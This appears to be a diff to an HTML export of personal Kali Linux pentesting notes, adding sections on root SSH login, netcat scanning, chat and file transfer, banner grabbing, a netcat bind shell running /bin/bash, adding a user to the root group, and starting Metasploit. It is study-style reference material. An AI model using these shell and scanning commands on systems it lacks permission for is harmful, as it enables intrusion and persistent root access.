@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2017-03-05 Sun 23:56 -->
+<!-- 2017-03-17 Fri 21:08 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title></title>
@@ -246,6 +246,7 @@ for the JavaScript code in this tag.
 <li><a href="#org7d9bf98">install linux headers for kali</a></li>
 <li><a href="#org21f8483">install kali guest additions</a></li>
 <li><a href="#orge827794">use network managed mode</a></li>
+<li><a href="#org5a53a80">permit <code>Root</code> login for SSH</a></li>
 </ul>
 </li>
 <li><a href="#org60a3c62">google search operators</a></li>
@@ -260,6 +261,21 @@ for the JavaScript code in this tag.
 <li><a href="#orga555e35">port scan</a></li>
 <li><a href="#orgce02eec">banner grabbing</a></li>
 <li><a href="#orgbc16b59">host discovery with <code>arping</code></a></li>
+<li><a href="#orgadf47b9">netcat</a>
+<ul>
+<li><a href="#org67b0d92">port scan using <code>netcat</code></a></li>
+<li><a href="#org6b73ddd">communicate through <code>netcat</code></a></li>
+<li><a href="#orgb16bd7e"><code>netcat</code> chat interface</a></li>
+<li><a href="#org28e6b9c">transfering data with <code>netcat</code></a></li>
+<li><a href="#org2b2db1d">banner grabbing</a></li>
+<li><a href="#org2dc823c">Linux remote shell</a></li>
+</ul>
+</li>
+<li><a href="#org81c067c">metasploit</a>
+<ul>
+<li><a href="#org2765359">init</a></li>
+</ul>
+</li>
 </ul>
 </div>
 </div>
@@ -359,6 +375,18 @@ $ ./VBoxLinuxAdditions.run
 <div class="org-src-container">
 <pre class="src src-shell">$ vim /etc/NetworkManager.conf
 # change managed=false to managed=true
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5a53a80" class="outline-3">
+<h3 id="org5a53a80">permit <code>Root</code> login for SSH</h3>
+<div class="outline-text-3" id="text-org5a53a80">
+<div class="org-src-container">
+<pre class="src src-shell">$ vim /etc/ssh/sshd_config
+#  change line PermitRootLogin without-password
+#  PermitRootLogin yes
 </pre>
 </div>
 </div>
@@ -583,10 +611,134 @@ $ nc -u &lt;host&gt; &lt;port&gt;
 </div>
 </div>
 </div>
+
+<div id="outline-container-orgadf47b9" class="outline-2">
+<h2 id="orgadf47b9">netcat</h2>
+<div class="outline-text-2" id="text-orgadf47b9">
+</div><div id="outline-container-org67b0d92" class="outline-3">
+<h3 id="org67b0d92">port scan using <code>netcat</code></h3>
+<div class="outline-text-3" id="text-org67b0d92">
+<div class="org-src-container">
+<pre class="src src-shell">$ netcat -z -v domain.com 1-1000
+#ou can then use the -n flag to specify that you do not need to resolve the IP address using DNS:
+$ netcat -z -n -v 111.111.111.111 1-1000
+$ netcat -z -n -v 111.111.111.111 1-1000 2&gt;&amp;1 | grep succeeded
+# to randomized port scanning use -r switch
+$ nc –v –r –w 1 192.168.0.10 –z 1-1000
+# scanning a range of devices
+$ for i in {10..12}; do nc –vv –n –w 1 192.168.0.$i 21-25 –z; done
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org6b73ddd" class="outline-3">
+<h3 id="org6b73ddd">communicate through <code>netcat</code></h3>
+<div class="outline-text-3" id="text-org6b73ddd">
+<p>
+On one machine, you can tell netcat to listen to a specific port for
+connections. We can do this by providing the -l parameter and choosing a port:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">netcat -l 4444
+</pre>
+</div>
+
+<p>
+This will tell netcat to listen for TCP connections on port 4444
+</p>
+
+<p>
+On a second server, we can connect to the first machine on the port number we
+choose. We do this the same way we've been establishing connections previously:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">netcat domain.com 4444
+</pre>
+</div>
+
+<p>
+It will look as if nothing has happened. However, you can now send messages on
+either side of the connection and they will be seen on either end.
+</p>
+</div>
+</div>
+<div id="outline-container-orgb16bd7e" class="outline-3">
+<h3 id="orgb16bd7e"><code>netcat</code> chat interface</h3>
+<div class="outline-text-3" id="text-orgb16bd7e">
+<div class="org-src-container">
+<pre class="src src-shell">$ nc -l -p 4444         # host ip 192.168.1.102
+$ nc 192.168.1.102 4444
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org28e6b9c" class="outline-3">
+<h3 id="org28e6b9c">transfering data with <code>netcat</code></h3>
+<div class="outline-text-3" id="text-org28e6b9c">
+<div class="org-src-container">
+<pre class="src src-shell"># server +++ -w 30 wait for 30 seconds 
+$ nc –v –w 30 –p 31337 –l &lt; secret.txt
+# client
+$ nc –v –w 2 192.168.0.10 31337 &gt; secret.txt
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2b2db1d" class="outline-3">
+<h3 id="org2b2db1d">banner grabbing</h3>
+<div class="outline-text-3" id="text-org2b2db1d">
+<div class="org-src-container">
+<pre class="src src-shell">$ nc 192.168.1.1 80
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2dc823c" class="outline-3">
+<h3 id="org2dc823c">Linux remote shell</h3>
+<div class="outline-text-3" id="text-org2dc823c">
+<p>
+to prepare the listener we will type the following command into the command
+line:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">$ sudo nc –lp 31337 –e /bin/bash
+#Connecting to the target
+$ nc 192.168.0.11 31337
+# Adding a local user and placing into the root group
+$ useradd –g root bob
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org81c067c" class="outline-2">
+<h2 id="org81c067c">metasploit</h2>
+<div class="outline-text-2" id="text-org81c067c">
+</div><div id="outline-container-org2765359" class="outline-3">
+<h3 id="org2765359">init</h3>
+<div class="outline-text-3" id="text-org2765359">
+<div class="org-src-container">
+<pre class="src src-shell">$ service postgresql start
+$ service metasploit start
+$ msfconsole
+</pre>
+</div>
+</div>
+</div>
+</div>
 </div>
 <div id="postamble" class="status">
 <p class="author">Author: moh</p>
-<p class="date">Created: 2017-03-05 Sun 23:56</p>
+<p class="date">Created: 2017-03-17 Fri 21:08</p>
 <p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
 </div>
 </body>
